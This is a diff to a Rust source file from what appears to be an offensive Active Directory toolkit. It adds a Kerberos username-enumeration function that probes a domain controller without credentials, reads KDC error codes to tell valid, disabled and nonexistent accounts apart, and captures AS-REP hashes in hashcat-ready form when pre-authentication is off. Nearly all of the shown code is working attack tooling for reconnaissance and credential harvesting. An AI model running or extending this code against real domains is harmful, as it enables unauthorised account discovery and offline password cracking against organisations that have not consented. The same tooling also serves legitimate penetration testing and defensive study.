@@ -109,7 +109,7 @@ pub struct TicketGrantingData {
 }
 
 /// Crackable hash output (hashcat/john compatible)
-#[derive(Debug, Clone)]
+#[derive(Debug, Clone, PartialEq)]
 pub struct CrackableHash {
     pub username: String,
     pub domain: String,
@@ -430,6 +430,92 @@ pub async fn asrep_roast(dc_ip: &str, domain: &str, username: &str) -> Result<Cr
             })
         }
         Err(_) => Err(parse_krb_error(&response_bytes)),
+    }
+}
+
+// ═══════════════════════════════════════════════════════════
+//  Kerberos Username Enumeration (Zero-Knowledge)
+// ═══════════════════════════════════════════════════════════
+
+/// Result of a single username enumeration probe
+#[derive(Debug, Clone, PartialEq)]
+pub enum UserEnumStatus {
+    /// User exists and requires pre-authentication (KDC_ERR_PREAUTH_REQUIRED)
+    Valid,
+    /// User exists and does NOT require pre-auth — AS-REP hash captured
+    ValidNoPreauth(CrackableHash),
+    /// User exists but account is disabled/revoked (KDC_ERR_CLIENT_REVOKED)
+    Disabled,
+    /// User does not exist (KDC_ERR_C_PRINCIPAL_UNKNOWN)
+    NotFound,
+    /// KDC returned an unexpected error
+    Error(String),
+}
+
+/// Probe whether a username exists via Kerberos AS-REQ (no credentials needed).
+///
+/// Sends an AS-REQ without PA-ENC-TIMESTAMP. The KDC error code reveals:
+/// - `KDC_ERR_C_PRINCIPAL_UNKNOWN` (6)  → user does NOT exist
+/// - `KDC_ERR_PREAUTH_REQUIRED` (25)    → user EXISTS (needs pre-auth)
+/// - `KDC_ERR_CLIENT_REVOKED` (18)      → user EXISTS but disabled
+/// - Full AS-REP response               → user EXISTS + no pre-auth (hash captured)
+pub async fn user_enum_single(dc_ip: &str, domain: &str, username: &str) -> UserEnumStatus {
+    let realm = normalize_realm(domain);
+    let clean_username = normalize_username(username);
+
+    let req_body = build_as_req_body(clean_username, &realm, &[ETYPE_RC4_HMAC]);
+    let as_req = AsReq {
+        pvno: 5,
+        msg_type: 10,
+        padata: Some(vec![build_pa_pac_request(true)]),
+        req_body,
+    };
+
+    let response_bytes = match kdc_exchange(dc_ip, &as_req.build()).await {
+        Ok(bytes) => bytes,
+        Err(e) => return UserEnumStatus::Error(e.to_string()),
+    };
+
+    // If we get a valid AS-REP, the user exists AND has no pre-auth — jackpot
+    if let Ok((_, as_rep)) = AsRep::parse(&response_bytes) {
+        let enc_part = &as_rep.enc_part;
+        let cipher_data = &enc_part.cipher;
+        let cksum_len = if enc_part.etype == ETYPE_RC4_HMAC {
+            16
+        } else {
+            12
+        };
+        let (checksum, edata2) = cipher_data.split_at(std::cmp::min(cksum_len, cipher_data.len()));
+        let hash_string = format!(
+            "$krb5asrep${}${}@{}:{}${}",
+            enc_part.etype,
+            clean_username,
+            realm,
+            hex::encode(checksum),
+            hex::encode(edata2),
+        );
+        return UserEnumStatus::ValidNoPreauth(CrackableHash {
+            username: clean_username.to_string(),
+            domain: domain.to_string(),
+            spn: None,
+            hash_type: HashType::AsRepRoast,
+            hash_string,
+        });
+    }
+
+    // Parse KRB-ERROR to determine user existence
+    match KrbError::parse(&response_bytes) {
+        Ok((_, krb_err)) => match krb_err.error_code {
+            6 => UserEnumStatus::NotFound,      // KDC_ERR_C_PRINCIPAL_UNKNOWN
+            25 => UserEnumStatus::Valid,         // KDC_ERR_PREAUTH_REQUIRED
+            18 => UserEnumStatus::Disabled,      // KDC_ERR_CLIENT_REVOKED
+            24 => UserEnumStatus::Valid,         // KDC_ERR_PREAUTH_FAILED (user exists)
+            code => UserEnumStatus::Error(format!(
+                "KRB_ERROR {code}: {}",
+                krb_error_to_string(code)
+            )),
+        },
+        Err(_) => UserEnumStatus::Error("Failed to parse KDC response".to_string()),
     }
 }
 
